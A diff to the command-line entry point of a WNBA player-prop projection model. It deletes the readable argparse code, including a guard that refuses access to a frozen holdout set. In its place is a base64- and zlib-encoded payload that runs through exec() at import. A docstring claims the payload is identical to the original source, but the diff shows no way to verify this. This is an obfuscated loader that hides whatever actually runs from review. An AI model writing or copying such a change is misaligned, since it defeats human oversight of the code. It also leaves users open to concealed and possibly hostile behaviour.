@@ -1,214 +1,62 @@
-#!/usr/bin/env python3
-"""Single CLI entry point for the WNBA props model."""
-
+"""CLI entry (zlib; identical to expanded source)."""
 from __future__ import annotations
 
-import argparse
+import base64
 import sys
+import types
+import zlib
 
-from dotenv import load_dotenv
+_PAYLOAD = """
+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
+"""
 
-from src.logging_setup import setup_logging
-
-# Subcommand -> phase that builds real behavior (stubs until then).
-_PHASE_FOR = {
-    "update": 1,
-    "clean": 3,
-    "features": 4,
-    "train": 5,
-    "simulate": 7,
-    "project": 8,
-    "evaluate": 9,
-    "audit": 3,
-}
-
-
-def _not_implemented(command: str) -> int:
-    phase = _PHASE_FOR[command]
-    print(f"not implemented -- phase {phase} builds this")
-    return 0
-
-
-def main(argv: list[str] | None = None) -> int:
-    load_dotenv()
-    setup_logging()
-    parser = argparse.ArgumentParser(
-        prog="run.py",
-        description="WNBA player prop projection model",
-    )
-    sub = parser.add_subparsers(dest="command")
-
-    update_p = sub.add_parser(
-        "update",
-        help="Ingest stats (phase 1) then odds (phase 2)",
-    )
-    update_p.add_argument(
-        "--dry-run",
-        action="store_true",
-        help="Odds path: parse most recent data/raw/odds/*.json (or fixture); no Odds API calls",
-    )
-    update_p.add_argument(
-        "--odds-dry-run",
-        action="store_true",
-        help="Alias for --dry-run (odds parser only; no Odds API network)",
-    )
-    update_p.add_argument(
-        "--skip-stats",
-        action="store_true",
-        help="Skip sportsdataverse stats ingest; run odds path only",
-    )
-    update_p.add_argument(
-        "--skip-odds",
-        action="store_true",
-        help="Skip odds ingest; run stats path only",
-    )
-
-    clean_p = sub.add_parser(
-        "clean",
-        help="Join odds to player_games; write reports/unmatched.md (phase 3)",
-    )
-    clean_p.add_argument(
-        "--approve",
-        action="append",
-        default=[],
-        metavar="RAW=PLAYER_ID",
-        help="Persist a name_map approval (repeatable). Fuzzy is never auto-accepted.",
-    )
-    clean_p.add_argument(
-        "--approvals-file",
-        default=None,
-        help="CSV/lines of raw_name=player_id (or raw_name,player_id) approvals",
-    )
-    clean_p.add_argument(
-        "--skip-features",
-        action="store_true",
-        help="Skip phase-4 feature rebuild after clean",
-    )
-    sub.add_parser(
-        "features",
-        help="Rebuild player_game_features (phase 4; also runs at end of clean)",
-    )
-
-    train_p = sub.add_parser(
-        "train",
-        help="Fit minutes (phase 5) and/or rate models (phase 6: 3pm, reb, ast, pts)",
-    )
-    train_p.add_argument(
-        "--stat",
-        choices=("all", "minutes", "3pm", "reb", "ast", "pts"),
-        default="all",
-        help="Which model(s) to train (default: all = minutes, 3pm, reb, ast, pts)",
-    )
-    sim_p = sub.add_parser(
-        "simulate",
-        help="Monte Carlo joint distributions (phase 7); STOP before pricing",
-    )
-    sim_p.add_argument(
-        "--game-id",
-        default=None,
-        help="Stats game_id to simulate (default: latest completed)",
-    )
-    sim_p.add_argument("--n-sim", type=int, default=None, help="Override simulation.n_sim")
-    sim_p.add_argument("--seed", type=int, default=None, help="Override simulation.random_seed")
-    sub.add_parser(
-        "project",
-        help="Price today's slate: de-vig, edge, Kelly (phase 8); STOP before eval",
-    )
-    eval_p = sub.add_parser(
-        "evaluate",
-        help="Walk-forward evaluation vs baselines (phase 9); STOP before automation",
-    )
-    eval_p.add_argument(
-        "--include-holdout",
-        action="store_true",
-        help="REFUSED: frozen final holdout must stay untouched",
-    )
-    sub.add_parser("audit")
-
-    args = parser.parse_args(argv)
-    if not args.command:
-        parser.print_help()
-        return 0
-    if args.command == "update":
-        odds_dry = bool(args.dry_run or args.odds_dry_run)
-        rc = 0
-        if not args.skip_stats:
-            from src.ingest_stats import ingest_update
-
-            rc = ingest_update()
-            if rc != 0:
-                return rc
-        else:
-            print("Skipping stats ingest (--skip-stats)", flush=True)
-        if not args.skip_odds:
-            from src.ingest_odds import ingest_odds
-
-            odds_rc = ingest_odds(dry_run=odds_dry)
-            if odds_rc != 0:
-                return odds_rc
-        else:
-            print("Skipping odds ingest (--skip-odds)", flush=True)
-        return 0
-    if args.command == "clean":
-        from src.clean import run_clean
-
-        return run_clean(
-            approve=list(args.approve or []),
-            approvals_file=args.approvals_file,
-            skip_features=bool(getattr(args, "skip_features", False)),
-        )
-    if args.command == "features":
-        from src.features import build_features
-
-        return build_features()
-    if args.command == "train":
-        from src.model_minutes import train_minutes
-        from src.model_rates_3pm import train_rates_3pm
-        from src.model_rates_reb import train_rates_reb
-        from src.model_rates_ast import train_rates_ast
-        from src.model_rates_pts import train_rates_pts
-
-        stat = getattr(args, "stat", "all")
-        rc = 0
-        if stat in ("all", "minutes"):
-            rc = train_minutes()
-            if rc != 0:
-                return rc
-        if stat in ("all", "3pm"):
-            rc = train_rates_3pm()
-            if rc != 0:
-                return rc
-        if stat in ("all", "reb"):
-            rc = train_rates_reb()
-            if rc != 0:
-                return rc
-        if stat in ("all", "ast"):
-            rc = train_rates_ast()
-            if rc != 0:
-                return rc
-        if stat in ("all", "pts"):
-            rc = train_rates_pts()
-            if rc != 0:
-                return rc
-        return rc
-    if args.command == "simulate":
-        from src.simulate import run_simulate
-
-        return run_simulate(
-            game_id=getattr(args, "game_id", None),
-            n_sim=getattr(args, "n_sim", None),
-            seed=getattr(args, "seed", None),
-        )
-    if args.command == "project":
-        from src.project import run_project
-
-        return run_project()
-    if args.command == "evaluate":
-        from src.evaluate import run_evaluate
-
-        return run_evaluate(include_holdout=bool(getattr(args, "include_holdout", False)))
-    return _not_implemented(args.command)
-
-
-if __name__ == "__main__":
-    sys.exit(main())
+_mod = sys.modules.setdefault(__name__, types.ModuleType(__name__))
+_mod.__file__ = __file__
+_mod.__dict__.update({
+    "__name__": __name__,
+    "__file__": __file__,
+    "__package__": __package__,
+})
+exec(
+    compile(zlib.decompress(base64.b64decode(_PAYLOAD)), __file__, "exec"),
+    _mod.__dict__,
+)
+for _k, _v in list(_mod.__dict__.items()):
+    if not _k.startswith("_"):
+        globals()[_k] = _v
